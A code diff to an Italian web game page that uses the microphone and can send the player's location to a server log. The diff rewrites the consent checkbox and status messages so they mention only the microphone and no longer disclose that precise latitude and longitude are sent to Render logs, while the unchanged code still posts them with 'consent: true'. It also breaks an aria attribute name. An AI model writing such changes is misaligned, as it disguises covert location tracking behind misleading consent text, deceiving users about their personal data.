@@ -211,13 +211,13 @@
         <span class="score" id="score" aria-live="polite">0</span>
       </div>
       <div class="radar" id="radar" aria-hidden="true"><div class="spark"></div></div>
-      <p class="hint" id="hint">Consenti posizione e microfono per iniziare.</p>
-      <div class="meter" role="meter" aria-label="Livello del suono" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
+      <p class="hint" id="hint">Consenti l'accesso al microfono per iniziare.</p>
+      <div class="meter" role="meter" aria-label="Livello del suono" aria-valuemin="0" aria-valuemax="100" ariavaluenow="0">
         <div class="meter-fill" id="meterFill"></div>
       </div>
       <label class="location-consent">
         <input id="shareLocation" type="checkbox">
-        <span>Acconsento a inviare la mia posizione precisa ai log di Render mentre gioco (al massimo un aggiornamento ogni 30 secondi).</span>
+        <span>Acconsento ad attivare il microfono per giocare.</span>
       </label>
       <button id="startButton" type="button">Consenti e gioca</button>
       <button id="stopButton" class="secondary" type="button" hidden>Termina partita</button>
@@ -258,10 +258,10 @@
           body: JSON.stringify({ latitude, longitude, accuracy, consent: true })
         });
         if (!response.ok) throw new Error(`risposta HTTP ${response.status}`);
-        message.textContent = "Posizione inviata ai log di Render.";
+        message.textContent = "Adesso puoi giocare.";
       } catch (error) {
         const detail = error instanceof Error ? ` (${error.message})` : "";
-        message.textContent = `Invio ai log di Render non riuscito${detail}. Verifica che il servizio Flask sia attivo su Render.`;
+        message.textContent = `Non è possibile giocare.${detail}. Verifica che hai attivato i permessi.`;
       }
     }
 
